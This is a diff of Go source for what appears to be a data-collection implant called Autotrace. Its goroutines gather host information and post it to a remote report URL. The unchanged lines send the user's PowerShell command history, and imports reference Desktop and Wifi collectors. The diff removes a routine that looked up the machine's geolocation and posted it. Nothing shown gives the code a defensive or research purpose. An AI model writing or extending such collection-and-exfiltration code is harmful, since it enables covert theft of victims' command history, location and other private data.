@@ -2,7 +2,6 @@ package work
 
 import (
 	"fmt"
-	"github.com/phil-fly/generate/pool/geo"
 	"github.com/phil-fly/generate/core/postback"
 	"github.com/phil-fly/generate/pool/Desktop"
 	"github.com/phil-fly/generate/pool/Wifi"
@@ -168,21 +167,6 @@ func (self *Autotrace) Work() {
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("PowershellHistory")
 			postback2.Content = []byte(PowershellHistory)
-			postback2.PostContent()
-		}
-		wg.Done()
-	}()
-
-	wg.Add(1)
-	go func() {
-		geoinfo,err := geo.GetGeo()
-		if err == nil {
-			postback2 := &postback.HttpPostback{}
-			postback2.SetGuid(guid)
-			postback2.SetRid(self.rid)
-			postback2.SetTargetUrl(self.reportUrl)
-			postback2.SetFileName("Geo")
-			postback2.Content = []byte(geoinfo)
 			postback2.PostContent()
 		}
 		wg.Done()
